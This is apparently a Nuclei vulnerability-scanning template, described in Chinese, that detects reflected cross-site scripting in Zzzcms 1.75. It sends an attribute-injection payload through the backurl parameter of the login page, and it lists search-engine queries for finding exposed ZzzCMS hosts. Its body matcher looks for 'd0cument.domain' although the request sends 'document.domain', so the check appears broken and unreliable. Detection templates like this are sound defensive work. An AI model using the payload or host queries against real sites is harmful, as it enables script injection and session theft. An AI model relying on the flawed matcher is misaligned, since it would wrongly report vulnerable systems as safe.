id: zzzcms-xss

info:
  name: Zzzcms 1.75 - 跨站脚本漏洞
  author: ritikchaddha
  severity: medium
  description: |
    该模板用于检测 Zzzcms 1.75 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://github.com/Ares-X/VulWiki/blob/master/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.75%20xss%E6%BC%8F%E6%B4%9E.md
  classification:
    cpe: cpe:2.3:a:zzzcms:zzzcms:*:*:*:*:*:*:*:*
    cwe-id: CWE-79,CWE-83
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"ZzzCMS"
    fofa-query: title="ZzzCMS"
    product: zzzcms
    vendor: zzzcms
  tags: zzzcms,xss,vuln

http:
  - raw:
      - |
        GET /plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'onmouseover=alert(/d0cument.domain/) y=&act'
          - 'document.write("'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
